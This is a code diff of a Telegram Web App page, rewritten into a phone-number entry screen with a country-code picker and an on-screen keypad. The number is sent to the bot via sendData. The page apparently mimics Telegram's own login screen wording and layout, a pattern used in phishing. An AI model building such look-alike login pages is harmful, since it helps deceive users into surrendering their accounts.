@@ -3,29 +3,162 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Web App Form</title>
+    <title>Номер телефона</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        :root {
+            --bg-color: var(--tg-theme-bg-color, #ffffff);
+            --text-color: var(--tg-theme-text-color, #000000);
+            --hint-color: var(--tg-theme-hint-color, #999999);
+            --button-color: var(--tg-theme-button-color, #0078FF);
+            --button-text-color: var(--tg-theme-button-text-color, #ffffff);
+            --secondary-bg-color: var(--tg-theme-secondary-bg-color, #f0f0f0);
+        }
+
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+            width: 90%;
+        }
+
+        h1 {
+            font-size: 20px;
+            margin-bottom: 8px;
+        }
+
+        p {
+            font-size: 14px;
+            margin-bottom: 24px;
+            color: var(--hint-color);
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-group select, .input-group input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 8px;
+            border-radius: 8px;
+            border: 1px solid var(--secondary-bg-color);
+            background: var(--secondary-bg-color);
+            color: var(--text-color);
+            font-size: 16px;
+        }
+
+        .keyboard {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-top: 24px;
+        }
+
+        .keyboard button {
+            padding: 16px;
+            font-size: 18px;
+            background: var(--secondary-bg-color);
+            color: var(--text-color);
+            border: none;
+            border-radius: 8px;
+        }
+
+        .keyboard button:active {
+            background: var(--hint-color);
+        }
+
+        .submit-btn {
+            margin-top: 24px;
+            background: var(--button-color);
+            color: var(--button-text-color);
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            width: 100%;
+            font-size: 16px;
+        }
+
+        .submit-btn:active {
+            background: darken(var(--button-color), 10%);
+        }
+    </style>
 </head>
 <body>
     <div class="container">
-        <h2>Подтверждение данных</h2>
-        <form id="userForm">
-            <label for="firstName">Имя</label>
-            <input type="text" id="firstName" placeholder="Ваше имя" required>
-            
-            <label for="lastName">Фамилия</label>
-            <input type="text" id="lastName" placeholder="Ваша фамилия" required>
-            
-            <label for="middleName">Отчество</label>
-            <input type="text" id="middleName" placeholder="Ваше отчество">
-            
-            <label for="phone">Номер телефона</label>
-            <input type="tel" id="phone" placeholder="+31XXXXXXXXX" required>
-            
-            <button type="button" id="submitButton">Отправить</button>
-        </form>
+        <h1>Номер телефона</h1>
+        <p>Проверьте код страны и введите свой номер телефона.</p>
+        
+        <div class="input-group">
+            <select id="country-code">
+                <option value="+7">Россия (+7)</option>
+                <option value="+1">США (+1)</option>
+                <option value="+44">Великобритания (+44)</option>
+            </select>
+            <input id="phone-number" type="text" placeholder="Номер телефона" readonly>
+        </div>
+        
+        <div class="keyboard">
+            <button onclick="addNumber('1')">1</button>
+            <button onclick="addNumber('2')">2</button>
+            <button onclick="addNumber('3')">3</button>
+            <button onclick="addNumber('4')">4</button>
+            <button onclick="addNumber('5')">5</button>
+            <button onclick="addNumber('6')">6</button>
+            <button onclick="addNumber('7')">7</button>
+            <button onclick="addNumber('8')">8</button>
+            <button onclick="addNumber('9')">9</button>
+            <button onclick="addNumber('+')">+</button>
+            <button onclick="addNumber('0')">0</button>
+            <button onclick="deleteNumber()">⌫</button>
+        </div>
+        
+        <button class="submit-btn" onclick="submitPhoneNumber()">→</button>
     </div>
-    <script src="app.js"></script>
+    
+    <script>
+        let phoneNumberInput = document.getElementById('phone-number');
+
+        // Инициализация Telegram WebApp
+        Telegram.WebApp.ready();
+        const themeParams = Telegram.WebApp.themeParams;
+
+        function addNumber(num) {
+            phoneNumberInput.value += num;
+        }
+
+        function deleteNumber() {
+            phoneNumberInput.value = phoneNumberInput.value.slice(0, -1);
+        }
+
+        function submitPhoneNumber() {
+            let countryCode = document.getElementById('country-code').value;
+            let phoneNumber = phoneNumberInput.value;
+            if (phoneNumber) {
+                Telegram.WebApp.sendData(`${countryCode}${phoneNumber}`);
+                Telegram.WebApp.close();
+            } else {
+                alert('Введите номер телефона');
+            }
+        }
+
+        // Адаптация под тему Telegram
+        document.documentElement.style.setProperty('--bg-color', themeParams.bg_color || '#ffffff');
+        document.documentElement.style.setProperty('--text-color', themeParams.text_color || '#000000');
+        document.documentElement.style.setProperty('--hint-color', themeParams.hint_color || '#999999');
+        document.documentElement.style.setProperty('--button-color', themeParams.button_color || '#0078FF');
+        document.documentElement.style.setProperty('--button-text-color', themeParams.button_text_color || '#ffffff');
+        document.documentElement.style.setProperty('--secondary-bg-color', themeParams.secondary_bg_color || '#f0f0f0');
+    </script>
 </body>
 </html>
